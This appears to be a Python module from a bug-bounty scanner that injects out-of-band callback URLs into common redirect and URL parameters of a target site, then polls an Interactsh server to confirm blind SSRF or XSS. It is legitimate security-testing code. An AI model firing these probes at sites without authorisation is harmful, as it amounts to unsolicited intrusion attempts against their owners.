"""OOB callbacks — SSRF/XSS aveugle via serveur collaborateur."""

from __future__ import annotations

import time
import uuid

import requests

from .utils import Finding, build_url_with_params, normalize_url, safe_request

OOB_PATHS = [
    "http://{callback}/ssrf-test",
    "http://{callback}/",
    "https://{callback}/bountystrike",
]


class OOBScanner:
    """Injecte des payloads OOB et vérifie les callbacks."""

    def __init__(self, target: str, session: requests.Session, callback_domain: str | None = None):
        self.target = normalize_url(target)
        self.session = session
        self.callback = callback_domain
        self.findings: list[Finding] = []
        self.token = uuid.uuid4().hex[:12]

    def run_full_scan(self, urls: list[str] | None = None) -> list[Finding]:
        if not self.callback:
            self.findings.append(
                Finding(
                    title="OOB non configuré",
                    severity="info",
                    category="OOB",
                    url=self.target,
                    description="Utilisez --oob-callback domain.com (Interactsh/Burp Collaborator)",
                )
            )
            return self.findings

        callback_url = f"{self.token}.{self.callback}"
        scan_urls = (urls or [self.target])[:8]

        for url in scan_urls:
            base = url.split("?")[0]
            for param in ("url", "uri", "path", "dest", "redirect", "callback", "next", "data"):
                for template in OOB_PATHS:
                    payload = template.format(callback=callback_url)
                    safe_request(self.session, "GET", build_url_with_params(base, {param: payload}))

        self.findings.append(
            Finding(
                title=f"Payloads OOB injectés (token: {self.token})",
                severity="info",
                category="OOB",
                url=self.target,
                description=f"Vérifiez les callbacks sur *.{self.callback} pour le token {self.token}",
                evidence=f"Callback: {callback_url}",
            )
        )

        # Polling Interactsh si format interactsh
        if "oast" in self.callback or "interact" in self.callback:
            self._poll_interactsh()
        return self.findings

    def _poll_interactsh(self) -> None:
        """Tente de récupérer les interactions (Interactsh public)."""
        try:
            resp = requests.get(
                f"https://{self.callback}/poll?secret={self.token}",
                timeout=5,
            )
            if resp.status_code == 200 and resp.text.strip():
                self.findings.append(
                    Finding(
                        title="SSRF/XSS OOB confirmé!",
                        severity="critical",
                        category="OOB Confirmed",
                        url=self.target,
                        description="Interaction OOB reçue",
                        evidence=resp.text[:300],
                    )
                )
        except requests.RequestException:
            pass
